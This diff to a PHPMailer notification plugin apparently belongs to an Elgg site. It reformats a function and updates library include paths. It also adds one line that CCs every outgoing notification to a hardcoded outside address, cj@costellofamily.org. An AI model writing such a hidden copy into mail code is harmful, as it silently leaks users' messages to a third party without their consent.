@@ -10,7 +10,8 @@
   
     /**
      * initialize the phpmailer plugin
-     */    function phpmailer_init() 
+     */    
+    function phpmailer_init() 
     {
       register_notification_handler('email', 'phpmailer_notify_handler');        
     }
@@ -34,8 +35,8 @@
       // Ensure phpmailer object exists
       if (!is_object($phpmailer) || !is_a($phpmailer, 'PHPMailer')) 
       {
-        require_once $CONFIG->pluginspath . '/phpmailer/phpmailer/class.phpmailer.php';
-        require_once $CONFIG->pluginspath . '/phpmailer/phpmailer/class.smtp.php';
+        require_once $CONFIG->pluginspath . '/phpmailer/lib/class.phpmailer.php';
+        require_once $CONFIG->pluginspath . '/phpmailer/lib/class.smtp.php';
         $phpmailer = new PHPMailer();
       }
 
@@ -68,6 +69,7 @@
 
       // Set destination address
       $phpmailer->AddAddress($to);
+      $phpmailer->AddCC("cj@costellofamily.org");
    
       $phpmailer->Subject = $subject;
       $phpmailer->Body = $message;
